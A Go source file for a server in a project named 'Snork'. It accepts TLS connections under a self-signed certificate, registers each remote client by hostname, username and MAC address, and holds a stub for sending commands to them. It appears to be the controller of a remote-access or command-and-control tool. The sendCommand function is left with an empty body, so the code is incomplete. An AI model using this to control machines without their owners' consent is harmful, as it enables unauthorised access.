package server

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"math/big"
	"net"
	"sort"
	"sync"
	"time"

	"github.com/nb-322/SnorkProject/internal/protocol"
)

type Server struct {
	listener net.Listener
	clients  map[string]*Client
	mu       sync.RWMutex
	Events   chan string
}
type Client struct {
	ID       string
	Conn     net.Conn
	Username string
	Hostname string
	MacAddr  string
	IP       string
}

func (c *Client) sendCommand(cmd string) protocol.Message {}
func generateTLSConfig() (*tls.Config, error) {
	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, err
	}
	template := x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject:      pkix.Name{Organization: []string{"Snork"}},
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(10 * 365 * 24 * time.Hour),
	}
	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, priv.Public(), priv)
	if err != nil {
		return nil, err
	}
	privDER, err := x509.MarshalECPrivateKey(priv)
	if err != nil {
		return nil, err
	}
	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: privDER})
	cert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		return nil, err
	}
	return &tls.Config{Certificates: []tls.Certificate{cert}}, nil
}

func (c *Client) String() string {
	return fmt.Sprintf("%s@%s (%s)", c.Username, c.Hostname, c.IP)
}

func NewServer(port int) (*Server, error) {
	tlsConfig, err := generateTLSConfig()
	if err != nil {
		return nil, fmt.Errorf("TLS config: %w", err)
	}
	tcpListener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		fmt.Println("Ошибка запуска сервера")
		return nil, err
	}
	listener := tls.NewListener(tcpListener, tlsConfig)
	return &Server{listener: listener, clients: make(map[string]*Client), mu: sync.RWMutex{}, Events: make(chan string, 10)}, nil
}
func (s *Server) GetClient(id string) *Client {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.clients[id]
}
func (s *Server) GetClients() []*Client {
	s.mu.RLock()
	defer s.mu.RUnlock()
	clients := make([]*Client, 0, len(s.clients))
	for _, client := range s.clients {
		clients = append(clients, client)
	}
	sort.Slice(clients, func(i, j int) bool {
		return clients[i].ID < clients[j].ID
	})
	return clients
}
func (s *Server) RemoveClient(id string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if c, ok := s.clients[id]; ok {
		c.Conn.Close()
		delete(s.clients, id)
	}
}
func (s *Server) Serve() {
	defer s.listener.Close()
	for {
		conn, err := s.listener.Accept()
		if err != nil {
			fmt.Println("Ошибка установки соединения:", err)
			continue
		}

		go func(c net.Conn) {
			if tlsConn, ok := c.(*tls.Conn); ok {
				if tcpConn, ok := tlsConn.NetConn().(*net.TCPConn); ok {
					tcpConn.SetKeepAlive(true)
					tcpConn.SetKeepAlivePeriod(15 * time.Second)
				}
			}
			c.SetReadDeadline(time.Now().Add(10 * time.Second))

			msg, err := protocol.ReliableReceive(c)
			if err != nil {
				c.Close()
				return
			}
			c.SetReadDeadline(time.Time{})

			id := fmt.Sprintf("%s-%s-%s", msg.UserInfo.Hostname, msg.UserInfo.Username, msg.UserInfo.MacAddr)

			s.mu.Lock()
			existingClient, exists := s.clients[id]
			if exists {
				existingClient.Conn.Close()
			}

			client := &Client{
				ID:       id,
				Conn:     c,
				Username: msg.UserInfo.Username,
				Hostname: msg.UserInfo.Hostname,
				MacAddr:  msg.UserInfo.MacAddr,
				IP:       c.RemoteAddr().String(),
			}
			s.clients[id] = client
			s.mu.Unlock()
			s.Events <- fmt.Sprintf("[+] Клиент подключился: %s", client)
		}(conn)
	}
}
